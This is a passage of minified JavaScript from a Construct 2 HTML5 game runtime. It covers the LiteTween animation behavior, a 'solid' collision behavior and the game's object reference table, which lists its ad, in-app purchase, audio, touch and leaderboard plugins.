            else if (8 === t.tweened) t.enforce ? this.inst.y = t.initialparam2 + (t.targetparam2 - t.initialparam2) * e : (this.inst.y += (t.targetparam2 - t.initialparam2) * e - t.lastKnownValue2, t.lastKnownValue2 = (t.targetparam2 - t.initialparam2) * e);
            else if (9 === t.tweened) {
                var n = t.initialparam1 + (t.targetparam1 - t.initialparam1) * e,
                    r = t.initialparam2 + (t.targetparam2 - t.initialparam2) * e;
                this.inst.width < 0 && (n = t.initialparam1 + (t.targetparam1 + t.initialparam1) * -e), this.inst.height < 0 && (r = t.initialparam2 + (t.targetparam2 + t.initialparam2) * -e), t.enforce ? (this.inst.width = this.inst.curFrame.width * n, this.inst.height = this.inst.curFrame.height * r) : (this.inst.width < 0 ? (this.inst.width = n * (this.inst.width / (-1 + t.lastKnownValue)), t.lastKnownValue = n + 1) : (this.inst.width = n * (this.inst.width / (1 + t.lastKnownValue)), t.lastKnownValue = n - 1), this.inst.height < 0 ? (this.inst.height = r * (this.inst.height / (-1 + t.lastKnownValue2)), t.lastKnownValue2 = r + 1) : (this.inst.height = r * (this.inst.height / (1 + t.lastKnownValue2)), t.lastKnownValue2 = r - 1))
            }
            this.inst.set_bbox_changed()
        }, e.tick = function () {
            var t = this.runtime.getDt(this.inst),
                e = this.tween_list.default;
            if (0 !== e.state) {
                e.onStart && (this.runtime.trigger(cr.behaviors.lunarray_LiteTween.prototype.cnds.OnStart, this.inst), e.onStart = !1), e.onReverseStart && (this.runtime.trigger(cr.behaviors.lunarray_LiteTween.prototype.cnds.OnReverseStart, this.inst), e.onReverseStart = !1), this.active = 1 == e.state || 2 == e.state || 4 == e.state || 5 == e.state || 6 == e.state;
                var i = e.OnTick(t);
                this.updateTween(e, i), e.onEnd && (this.runtime.trigger(cr.behaviors.lunarray_LiteTween.prototype.cnds.OnEnd, this.inst), e.onEnd = !1), e.onReverseEnd && (this.runtime.trigger(cr.behaviors.lunarray_LiteTween.prototype.cnds.OnReverseEnd, this.inst), e.onReverseEnd = !1)
            }
        }, t.cnds = {};
        var i = t.cnds;
        i.IsActive = function () {
            return 0 !== this.tween_list.default.state
        }, i.IsReversing = function () {
            return 2 == this.tween_list.default.state
        }, i.CompareProgress = function (t, e) {
            var i = this.tween_list.default;
            return cr.do_cmp(i.progress / i.duration, t, e)
        }, i.OnThreshold = function (t, e) {
            var i = this.tween_list.default;
            this.threshold = cr.do_cmp(i.progress / i.duration, t, e);
            var n = this.oldthreshold != this.threshold && this.threshold;
            return n && (this.oldthreshold = this.threshold), n
        }, i.OnStart = function () {
            return void 0 !== this.tween_list.default && this.tween_list.default.onStart
        }, i.OnReverseStart = function () {
            return void 0 !== this.tween_list.default && this.tween_list.default.onReverseStart
        }, i.OnEnd = function () {
            return void 0 !== this.tween_list.default && this.tween_list.default.onEnd
        }, i.OnReverseEnd = function () {
            return void 0 !== this.tween_list.default && this.tween_list.default.onReverseEnd
        }, t.acts = {};
        var n = t.acts;
        n.Start = function (t, e) {
            this.threshold = !1, this.oldthreshold = !1, this.useCurrent = 1 == e, this.startTween(t)
        }, n.Stop = function (t) {
            this.stopTween(t)
        }, n.Reverse = function (t) {
            this.threshold = !1, this.oldthreshold = !1, this.reverseTween(t)
        }, n.ProgressTo = function (t) {
            this.setProgressTo(t)
        }, n.SetDuration = function (t) {
            isNaN(t) || t < 0 || void 0 !== this.tween_list.default && (this.tween_list.default.duration = t)
        }, n.SetEnforce = function (t) {
            void 0 !== this.tween_list.default && (this.tween_list.default.enforce = 1 === t)
        }, n.SetInitial = function (t) {
            if (void 0 !== this.tween_list.default) {
                var e = this.parseCurrent(this.tween_list.default.tweened, t);
                this.tween_list.default.setInitial(e)
            }
        }, n.SetTarget = function (t, e, i) {
            if (void 0 !== this.tween_list.default && !isNaN(i)) {
                var n = this.tween_list.default,
                    r = i + "";
                this.targetmode = e;
                var s = "",
                    o = "";
                if (1 === e) {
                    switch (this.target = "relative(" + r + ")", t) {
                        case 0:
                            s = this.inst.x + i, o = n.targetparam2;
                            break;
                        case 1:
                            s = n.targetparam1, o = this.inst.y + i;
                            break;
                        case 2:
                            o = s = "" + cr.to_degrees(this.inst.angle + cr.to_radians(i));
                            break;
                        case 3:
                            o = s = "" + 100 * this.inst.opacity + i;
                            break;
                        case 4:
                            s = this.inst.width + i, o = n.targetparam2;
                            break;
                        case 5:
                            s = n.targetparam1, o = this.inst.height + i;
                            break;
                        case 6:
                            s = i, o = i;
                            break;
                        default:
                            break
                    }
                    r = s + "," + o
                } else {
                    switch (t) {
                        case 0:
                            s = i, o = n.targetparam2;
                            break;
                        case 1:
                            s = n.targetparam1, o = i;
                            break;
                        case 2:
                            s = i, o = i;
                            break;
                        case 3:
                            s = i, o = i;
                            break;
                        case 4:
                            s = i, o = n.targetparam2;
                            break;
                        case 5:
                            s = n.targetparam1, o = i;
                            break;
                        case 6:
                            s = i, o = i;
                            break;
                        default:
                            break
                    }
                    r = s + "," + o, this.target = r
                }
                var a = this.parseCurrent(this.tween_list.default.tweened, "current"),
                    h = this.parseCurrent(this.tween_list.default.tweened, r);
                n.setInitial(a), n.setTarget(h)
            }
        }, n.SetTweenedProperty = function (t) {
            void 0 !== this.tween_list.default && (this.tween_list.default.tweened = t)
        }, n.SetEasing = function (t) {
            void 0 !== this.tween_list.default && (this.tween_list.default.easefunc = t)
        }, n.SetEasingParam = function (t, e, i, n, r) {
            void 0 !== this.tween_list.default && (this.tween_list.default.easingparam[t].optimized = !1, this.tween_list.default.easingparam[t].a = e, this.tween_list.default.easingparam[t].p = i, this.tween_list.default.easingparam[t].t = n, this.tween_list.default.easingparam[t].s = r)
        }, n.ResetEasingParam = function () {
            void 0 !== this.tween_list.default && (this.tween_list.default.optimized = !0)
        }, n.SetValue = function (t) {
            var e = this.tween_list.default;
            this.value = t, 6 === e.tweened && e.setInitial(this.parseCurrent(e.tweened, "current"))
        }, n.SetParameter = function (t, e, i, n, r) {
            if (void 0 === this.tween_list.default) this.addToTweenList("default", t, e, initial, i, n, r, 0);
            else {
                var s = this.tween_list.default;
                s.tweened = t, s.easefunc = e, s.setInitial(this.parseCurrent(t, "current")), s.setTarget(this.parseCurrent(t, i)), s.duration = n, s.enforce = 1 === r
            }
        }, t.exps = {};
        var r = t.exps;
        r.State = function (t) {
            var e = "N/A";
            switch (this.tween_list.default.state) {
                case 0:
                    e = "paused";
                    break;
                case 1:
                    e = "playing";
                    break;
                case 2:
                    e = "reversing";
                    break;
                case 3:
                    e = "seeking";
                    break;
                default:
                    break
            }
            t.set_string(e)
        }, r.Progress = function (t) {
            var e = this.tween_list.default.progress / this.tween_list.default.duration;
            t.set_float(e)
        }, r.Duration = function (t) {
            t.set_float(this.tween_list.default.duration)
        }, r.Target = function (t) {
            var e = this.tween_list.default,
                i = "N/A";
            switch (e.tweened) {
                case 0:
                    i = e.targetparam1;
                    break;
                case 1:
                    i = e.targetparam2;
                    break;
                case 2:
                    i = e.targetparam1;
                    break;
                case 3:
                    i = e.targetparam1;
                    break;
                case 4:
                    i = e.targetparam1;
                    break;
                case 5:
                    i = e.targetparam2;
                    break;
                case 6:
                    i = e.targetparam1;
                    break;
                default:
                    break
            }
            t.set_float(i)
        }, r.Value = function (t) {
            var e = this.value;
            t.set_float(e)
        }, r.Tween = function (t, e, i, n, r) {
            var s = n > 1 ? 1 : n,
                o = easeFunc(r, s < 0 ? 0 : s, 0, 1, 1, !1, !1);
            t.set_float(e + o * (i - e))
        }
    }(), cr.behaviors.solid = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.behaviors.solid.prototype;
        t.Type = function (t, e) {
            this.behavior = t, this.objtype = e, this.runtime = t.runtime
        }, t.Type.prototype.onCreate = function () {}, t.Instance = function (t, e) {
            this.type = t, this.behavior = t.behavior, this.inst = e, this.runtime = t.runtime
        };
        var e = t.Instance.prototype;

        function i() {}

        function n() {}
        e.onCreate = function () {
            this.inst.extra.solidEnabled = 0 !== this.properties[0]
        }, e.tick = function () {}, i.prototype.IsEnabled = function () {
            return this.inst.extra.solidEnabled
        }, t.cnds = new i, n.prototype.SetEnabled = function (t) {
            this.inst.extra.solidEnabled = !!t
        }, t.acts = new n
    }(), cr.getObjectRefTable = function () {
        return [cr.plugins_.Arr, cr.plugins_.Audio, cr.plugins_.ATPAds, cr.plugins_.ATPInApps, cr.plugins_.Browser, cr.plugins_.Cocoon_Canvasplus, cr.plugins_.Function, cr.plugins_.vooxe, cr.plugins_.LocalStorage, cr.plugins_.Rex_Comment, cr.plugins_.Particles, cr.plugins_.Keyboard, cr.plugins_.Rex_TimeLine, cr.plugins_.cranberrygame_CordovaGame, cr.plugins_.MagiCam, cr.plugins_.SpriteFontPlus, cr.plugins_.Sprite, cr.plugins_.cranberrygame_CordovaChartboost, cr.plugins_.sirg_kiz, cr.plugins_.Touch, cr.behaviors.lunarray_LiteTween, cr.behaviors.Fade, cr.behaviors.Pin, cr.behaviors.Rex_Duration, cr.behaviors.Rex_MoveTo, cr.behaviors.Anchor, cr.behaviors.Bullet, cr.behaviors.Rex_RotateTo, cr.behaviors.solid, cr.behaviors.Flash, cr.system_object.prototype.cnds.IsGroupActive, cr.system_object.prototype.cnds.OnLayoutStart, cr.system_object.prototype.cnds.CompareVar, cr.plugins_.ATPAds.prototype.acts.ShowBanner, cr.plugins_.cranberrygame_CordovaChartboost.prototype.acts.ShowInterstitialAd, cr.plugins_.Browser.prototype.cnds.OnBackButton, cr.plugins_.Audio.prototype.acts.Play, cr.plugins_.Cocoon_Canvasplus.prototype.acts.exitApp, cr.plugins_.Touch.prototype.cnds.OnTouchObject, cr.behaviors.Rex_Duration.prototype.cnds.IsRunning, cr.system_object.prototype.acts.GoToLayout, cr.plugins_.Function.prototype.acts.CallFunction, cr.plugins_.Keyboard.prototype.cnds.OnKeyReleased, cr.plugins_.Function.prototype.cnds.OnFunction, cr.system_object.prototype.acts.AddVar, cr.plugins_.LocalStorage.prototype.acts.SetItem, cr.plugins_.Audio.prototype.acts.Stop, cr.plugins_.sirg_kiz.prototype.acts.SubmitScore, cr.system_object.prototype.cnds.Else, cr.system_object.prototype.cnds.For, cr.plugins_.cranberrygame_CordovaGame.prototype.acts.IncrementAchievement, cr.plugins_.Arr.prototype.exps.At, cr.system_object.prototype.exps.loopindex, cr.system_object.prototype.cnds.Compare, cr.system_object.prototype.exps.loadingprogress, cr.system_object.prototype.cnds.TriggerOnce, cr.system_object.prototype.acts.SetLayerVisible, cr.plugins_.Sprite.prototype.acts.SetVisible, cr.system_object.prototype.acts.SetVar, cr.plugins_.SpriteFontPlus.prototype.acts.SetText, cr.plugins_.ATPAds.prototype.acts.HideBanner, cr.system_object.prototype.acts.SetTimescale, cr.system_object.prototype.cnds.LayerVisible, cr.system_object.prototype.acts.RestartLayout, cr.plugins_.Sprite.prototype.cnds.IsBoolInstanceVarSet, cr.plugins_.Sprite.prototype.cnds.OnAnimFinished, cr.plugins_.Sprite.prototype.acts.Destroy, cr.behaviors.lunarray_LiteTween.prototype.cnds.OnEnd, cr.behaviors.lunarray_LiteTween.prototype.acts.Reverse, cr.plugins_.Sprite.prototype.cnds.PickByUID, cr.plugins_.Function.prototype.exps.Param, cr.plugins_.Sprite.prototype.acts.Spawn, cr.plugins_.Particles.prototype.exps.UID, cr.plugins_.Sprite.prototype.exps.UID, cr.plugins_.Particles.prototype.acts.SetRate, cr.plugins_.Particles.prototype.acts.SetTimeout, cr.plugins_.Particles.prototype.cnds.CompareInstanceVar, cr.plugins_.Particles.prototype.acts.Destroy, cr.plugins_.Particles.prototype.cnds.PickByUID, cr.plugins_.Particles.prototype.acts.SetInstanceVar, cr.plugins_.Particles.prototype.acts.SetAngle, cr.plugins_.Sprite.prototype.exps.Angle, cr.behaviors.Pin.prototype.acts.Pin, cr.system_object.prototype.acts.SubVar, cr.plugins_.Audio.prototype.cnds.IsTagPlaying, cr.plugins_.Arr.prototype.exps.Width, cr.plugins_.Sprite.prototype.cnds.IsVisible, cr.plugins_.Sprite.prototype.cnds.IsAnimPlaying, cr.plugins_.Sprite.prototype.acts.SetEffectParam, cr.plugins_.Sprite.prototype.acts.SetAnim, cr.system_object.prototype.exps.mid, cr.system_object.prototype.exps.replace, cr.system_object.prototype.exps.left, cr.system_object.prototype.exps.right, cr.system_object.prototype.exps.len, cr.plugins_.cranberrygame_CordovaGame.prototype.acts.SubmitScore, cr.plugins_.Sprite.prototype.acts.SetAnimFrame, cr.system_object.prototype.exps.str, cr.plugins_.ATPInApps.prototype.acts.Purchase, cr.system_object.prototype.cnds.IsMobile, cr.behaviors.Rex_Duration.prototype.acts.Start, cr.plugins_.MagiCam.prototype.acts.CreateLocalCamera, cr.plugins_.Sprite.prototype.exps.X, cr.plugins_.Sprite.prototype.exps.Y, cr.plugins_.MagiCam.prototype.acts.FollowObject, cr.plugins_.MagiCam.prototype.acts.SetFollowLag, cr.plugins_.MagiCam.prototype.acts.EnableFollowing, cr.plugins_.Browser.prototype.cnds.IsPortraitLandscape, cr.system_object.prototype.cnds.ForEach, cr.plugins_.Sprite.prototype.cnds.IsOnLayer, cr.plugins_.Touch.prototype.cnds.OnTouchEnd, cr.plugins_.Touch.prototype.cnds.IsTouchingObject, cr.plugins_.Browser.prototype.acts.GoToURLWindow, cr.system_object.prototype.exps.layoutname, cr.plugins_.Audio.prototype.acts.SetVolume, cr.plugins_.Sprite.prototype.cnds.CompareOpacity, cr.plugins_.cranberrygame_CordovaGame.prototype.cnds.IsLoggedIn, cr.plugins_.cranberrygame_CordovaGame.prototype.acts.ShowLeaderboard, cr.plugins_.cranberrygame_CordovaGame.prototype.acts.Login, cr.plugins_.cranberrygame_CordovaGame.prototype.acts.ShowAchievements, cr.plugins_.cranberrygame_CordovaGame.prototype.cnds.OnLoginSucceeded, cr.plugins_.ATPInApps.prototype.cnds.onPurchaseComplete, cr.plugins_.ATPInApps.prototype.acts.Consume, cr.plugins_.Sprite.prototype.acts.SetOpacity, cr.plugins_.ATPAds.prototype.cnds.onInterstitialLoaded, cr.plugins_.ATPAds.prototype.acts.ShowInterstitial, cr.plugins_.ATPAds.prototype.cnds.onInterstitialDismissed, cr.plugins_.ATPAds.prototype.acts.LoadInterstitial, cr.plugins_.ATPAds.prototype.cnds.isShowingInterstitial, cr.plugins_.vooxe.prototype.cnds.onPauseGame, cr.plugins_.Audio.prototype.acts.SetMasterVolume, cr.plugins_.vooxe.prototype.cnds.onResumeGame, cr.plugins_.vooxe.prototype.acts.ShowBanner, cr.plugins_.vooxe.prototype.acts.InitAds, cr.plugins_.Arr.prototype.acts.SetSize, cr.plugins_.Arr.prototype.acts.SetX, cr.plugins_.LocalStorage.prototype.acts.CheckItemExists, cr.plugins_.ATPAds.prototype.acts.LoadBanner, cr.plugins_.ATPAds.prototype.acts.SetLayout, cr.plugins_.cranberrygame_CordovaChartboost.prototype.acts.PreloadInterstitialAd, cr.plugins_.ATPInApps.prototype.cnds.canPurchase, cr.plugins_.ATPInApps.prototype.acts.FetchProducts, cr.plugins_.LocalStorage.prototype.cnds.OnItemExists, cr.plugins_.LocalStorage.prototype.acts.GetItem, cr.plugins_.LocalStorage.prototype.cnds.OnItemMissing, cr.plugins_.LocalStorage.prototype.cnds.OnItemGet, cr.plugins_.LocalStorage.prototype.exps.ItemValue, cr.system_object.prototype.exps.find, cr.system_object.prototype.cnds.Every, cr.plugins_.Keyboard.prototype.cnds.IsKeyDown, cr.behaviors.Rex_RotateTo.prototype.acts.SetTargetAngle, cr.behaviors.Rex_RotateTo.prototype.acts.Stop, cr.plugins_.Touch.prototype.cnds.IsInTouch, cr.plugins_.Sprite.prototype.acts.SetBoolInstanceVar, cr.plugins_.Sprite.prototype.acts.SetInstanceVar, cr.plugins_.Touch.prototype.exps.TouchIndex, cr.plugins_.Sprite.prototype.acts.SetPos, cr.plugins_.Touch.prototype.exps.X, cr.plugins_.Touch.prototype.exps.Y, cr.plugins_.Sprite.prototype.acts.SetPosToObject, cr.system_object.prototype.exps.angle, cr.plugins_.Touch.prototype.exps.XAt, cr.plugins_.Touch.prototype.exps.YAt, cr.system_object.prototype.exps.distance, cr.behaviors.Rex_MoveTo.prototype.acts.Stop, cr.plugins_.Sprite.prototype.acts.MoveAtAngle, cr.behaviors.Rex_MoveTo.prototype.acts.SetTargetPos, cr.plugins_.Sprite.prototype.cnds.CompareX, cr.plugins_.Sprite.prototype.acts.SetX, cr.plugins_.Sprite.prototype.cnds.CompareY, cr.plugins_.Sprite.prototype.acts.SetY, cr.system_object.prototype.acts.CreateObject, cr.plugins_.Sprite.prototype.exps.ImagePointX, cr.plugins_.Sprite.prototype.exps.ImagePointY, cr.plugins_.Sprite.prototype.acts.SetHeight, cr.plugins_.Sprite.prototype.acts.SetAngle, cr.plugins_.Audio.prototype.cnds.OnEnded, cr.plugins_.Sprite.prototype.cnds.OnDestroyed, cr.plugins_.Sprite.prototype.cnds.CompareInstanceVar, cr.plugins_.Sprite.prototype.acts.SetScale, cr.behaviors.Bullet.prototype.acts.SetEnabled, cr.plugins_.Sprite.prototype.acts.MoveToBottom, cr.behaviors.Flash.prototype.cnds.IsFlashing, cr.plugins_.Sprite.prototype.exps.AnimationFrame, cr.behaviors.Flash.prototype.acts.Flash, cr.behaviors.lunarray_LiteTween.prototype.acts.Stop, cr.behaviors.lunarray_LiteTween.prototype.acts.Start, cr.plugins_.Sprite.prototype.cnds.CompareFrame, cr.plugins_.Sprite.prototype.exps.AnimationFrameCount, cr.plugins_.MagiCam.prototype.acts.ShakeCamera, cr.behaviors.Rex_Duration.prototype.acts.PauseAll, cr.system_object.prototype.acts.Wait, cr.system_object.prototype.exps.random, cr.plugins_.Sprite.prototype.exps.Count, cr.behaviors.Rex_RotateTo.prototype.acts.SetTargetAngleOnObject, cr.plugins_.Sprite.prototype.cnds.IsOnScreen, cr.plugins_.Sprite.prototype.cnds.OnCollision, cr.system_object.prototype.exps.int, cr.system_object.prototype.exps.floor, cr.behaviors.Bullet.prototype.acts.SetAngleOfMotion, cr.behaviors.lunarray_LiteTween.prototype.acts.SetTarget, cr.behaviors.Rex_MoveTo.prototype.cnds.IsMoving, cr.behaviors.Rex_MoveTo.prototype.acts.SetTargetPosOnObject, cr.system_object.prototype.cnds.PickOverlappingPoint, cr.plugins_.SpriteFontPlus.prototype.exps.Y]
    }, jQuery(document).ready((function () {
        cr_createRuntime("c2canvas")
    }));